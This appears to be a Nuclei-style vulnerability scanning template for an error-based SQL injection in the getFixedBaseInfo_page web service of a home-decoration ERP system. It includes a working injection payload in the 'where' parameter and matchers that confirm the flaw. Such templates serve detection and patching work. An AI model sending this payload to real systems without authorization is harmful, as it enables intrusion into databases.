id: poc-yaml-znfit-erp-ms-getfixedbaseinfo-page-sqli
info:
  name: 家装ERP管理系统 getFixedBaseInfo_page SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection

variables:
  t1: "{{rand_int(1000, 10000)}}"
  t2: "{{md5(t1)}}"

http:
  - raw:
      - |
        GET /main/login.aspx HTTP/1.1
        Host: {{Hostname}}
        Connection: close
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "上海装盟信息科技有限公司"

  - raw:
      - |
        GET /WEB_SERVICE/Budget.asmx/getFixedBaseInfo_page?where=1=sys.fn_varbintohexstr(hashbytes('MD5','{{t1}}'))&intPageIndex=1&pageSize=10 HTTP/1.1
        Host: {{Hostname}}
        Connection: close
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 500
      - type: word
        part: body
        words:
          - "0x{{t2}}"
      - type: regex
        part: body
        regex:
          - "转换成数据类型(.*?)时失败"
          - "在将(.*?)值"
